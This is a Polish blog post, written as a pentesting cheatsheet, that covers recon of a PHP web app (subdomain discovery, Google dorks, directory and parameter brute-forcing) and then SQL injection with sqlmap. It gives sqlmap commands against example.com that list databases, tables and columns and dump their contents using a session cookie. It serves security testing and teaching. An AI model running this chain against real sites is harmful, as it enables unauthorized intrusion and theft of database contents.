---
layout: post
title: SQL-injection - quick and dirty way
subtitle: Testowanie bezpieczeństwa aplikacji webowej napisanej w PHP
#gh-repo: daattali/beautiful-jekyll
#gh-badge: [star, fork, follow]
tags: [PHP, pentesting, security, web app pentesting, web aplication pentesting]
comments: true
---


Szybki #pwn-ing aplikacji webowej.
Artykuł ten może służyć jako cheatsheet do testów penetracyjnych aplikacji webowej napisanej w języku PHP. Skupiony jest głównie na poszukiwaniu podatności typu SQL-injection z wykorzystaniem gotowych narzędzi, ale niektóre jego elementy przy delikatnej modyfikacji mogą znaleźć zastosowanie w innych przypadkach. Na chwilę obecną nie zamierzam również dokładnie opisywać działania wszystkich użytych narzędzi, być może w przyszłości artykuł zostanie rozbity na mniejsze, bardziej szczegółowe części. Tymczasem, przejdźmy do sedna.

Załóżmy że celem naszych testów będzie domena example.com

## Zbieranie informacji o subdomenach:


### https://dnsdumpster.com

Podajemy nazwę domeny w celu wyszukania rekordów DNS. Zapisujemy zwrócone Host Records (A) które będą nam potrzebne do dalszej analizy.

### https://crt.sh

Strona crt.sh pozwala wyszukać zarejestrowane certyfikaty dla danej domeny. Przy użyciu wildcard-a możemy także wyszukać subdomeny.

%.example.com


### dnsenum -
Link: https://github.com/fwaeytens/dnsenum

```
dnsenum example.com  -f /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --threads 50
```  

### Google dorks:

Przy pomocy wyszukiwarki google możemy znaleźć wiele informacji przydatnych podczas pentestów, przykładowo:

__Pliki PHP__

```
site:example.com inurl:php
```

__parametry HTTP__

```
inurl:example.com/index.php
```

Jeżeli powyższy dork zwraca dużą ilosć wyników możemy go ogarniczyć poprzez usunięcie z wyników niechcianych ciągów znaków. 
```
inurl:example.com/index.php -id
```
Pozwoli nam to na łatwiejsze odnalezienie pozostałych parametrów HTTP.


__Foldery z włączonym listowaniem plików__

```
site:example.com title:Index of

site:example.com Parent Directory
```

__Kopie bezpieczeństwa__

```
site:example.com backup
```



## Brutforce contentu strony:  


### Dirbuster - korzystamy z GUI
Preinstalowany w dystrybucji Kali Linux
https://tools.kali.org/web-applications/dirbuster

Dirbuster pozwoli nam na znalezienie zamieszczonych na serwerze www folderów i plików. Najbardziej interesują nas te z rozszerzeniem *.php Warto jednak przejrzeć wszystkie znaleziska. Podczas przeprowadzanych przeze mnie testów bezpieczeństwa zdarzyły się sytuacje gdzie folder odnaleziony pod adresem http://example.com/backup zawierał backup bazy danych lub kodu aplikacji. Często możemy się również natknąć podatność typu Full Path Disclosure.

target url: https://example.com 
Jako target możemy również wybrać wszystkie subdomeny znalezione poprzez opisane wcześniej metody.
Słownik - /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 
zaznaczamy checkboxy - Brute Force Dirs, Be Recursive, Brute Force 
Files File extension: php

Czasem zdarza się że WAF/IDS/IPS nie pozwoli nam na jednoczesny bruteforce plików i katalogów, w takiej sytuacji możemy spróbować przeprowadzić dwa oddzielne testy.
W ustawieniach narzędzia warto również zmienić domyślny nagłówek Http User Agent. W tym celu wybieramy Options > Advanced Options > Http Options

### Gobuster

Podobnie jak Dirbuster pozwala nam bruteforce zawartości serwera www. Nie posiada on jednak GUI


Link: https://github.com/OJ/gobuster

```
gobuster dir -u https://example.com/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e -t 50 -x php
```


### Arjun
Link: https://github.com/s0md3v/Arjun

Arjun pomaga nam dowiedzieć się jakie parametry HTTP mogą być przekazywane do aplikacji webowej. Załóżmy sytuację w której za pomocą Google dorks znaleźliśmy adres https://example.com/index.php. Nie znając zawartości pliku index.php nie wiemy jakie parametry może przyjmować. 

```
python3 arjun.py -u https://example.com/index.php
```

Znalezione w ten sposób parametry można później wykorzystać przy szukaniu podatności typu XSS lub SQL-injection.



## Do tej pory powinniśmy zebrać informacje takie jak:


### Subdomeny:

subdomain1.example.com
subdomain2.example.com
(...).example.com

### Pliki php umieszczone na serwerach www:

http://example.com/index.php
https://domain2.example.com/posts.php

### Parametry HTTP przekazywane do aplikacji webowej.

http://example.com/index.php?id=2
https://domain2.example.com/posts.php?name=test

Do wyszukania podatności SQL-i wykorzystamy narzędzie 

### sqlmap
https://github.com/sqlmapproject/sqlmap


```
sqlmap -u "http://example.com/index.php?id=2" --random-agent --dbs --batch
```

Jeżeli testujemy aplikację w kontekscie zalogowanego użytkownika  do komendy należy dodać jego ciasteczka.

```
sqlmap -u "http://example.com/index.php?id=2" --random-agent --dbs --batch --cookies="PHPSESSID=oikbs8qcic2omf5gnd09kihsm7"
```

Przy znalezionej podatności opcja --dbs pozwoli nam pobrać nazwy baz danych. Listujemy tabele wybranej bazy danych poprzez opcję --tables
 
```
sqlmap -u "http://example.com/index.php?id=2" --random-agent --batch -D NAZWABAZYDANYCH --tables --cookies="PHPSESSID=oikbs8qcic2omf5gnd09kihsm7"
```

Następnie za pomocą opcji --columns wyświetlamy nazwy kolumn.

```
sqlmap -u "http://example.com/index.php?id=2" --random-agent --batch -D NAZWABAZYDANYCH -T NAZWATABELI --columns --cookies="PHPSESSID=oikbs8qcic2omf5gnd09kihsm7"
```

Znamy już nazwy tabel oraz zawartych w nich kolumn, aby pobrać ich zawartość wykonujemy polecenie:

```
sqlmap -u "http://example.com/index.php?id=2" --random-agent --batch -D NAZWABAZYDANYCH -T NAZWATABELI -C NAZWAKOLUMNY1,NAZWAKOLUMNY2 --dump --cookies="PHPSESSID=oikbs8qcic2omf5gnd09kihsm7"
```


